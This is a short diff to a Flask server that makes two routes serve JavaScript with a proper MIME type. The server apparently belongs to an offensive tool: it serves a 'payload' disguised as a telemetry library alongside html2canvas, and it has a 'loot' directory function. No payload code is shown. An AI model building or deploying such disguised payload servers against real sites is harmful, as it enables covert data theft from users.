@@ -129,16 +129,22 @@ def findLootDirectory(identifier):
 @app.route('/lib/telemlib.js', methods=['GET'])
 def sendPayload():
     with open('./telemlib.js', 'rb') as file:
-        return file.read(), 200
+        payload = file.read()
+        response = make_response(payload, 200)
+        response.mimetype = 'text/javascript'
+
+        return response
 
 
 # Send copy of html2canvas library
 @app.route('/lib/telemhelperlib.js', methods=['GET'])
 def sendHtml2Canvas():
     with open('./html2canvas.min.js', 'rb') as file:
-        return file.read(), 200
+        payload = file.read()
+        response = make_response(payload, 200)
+        response.mimetype = 'text/javascript'
 
-
+        return response
 
 # Send copy of jszip
 # @app.route('/lib/compress.js', methods=['GET'])
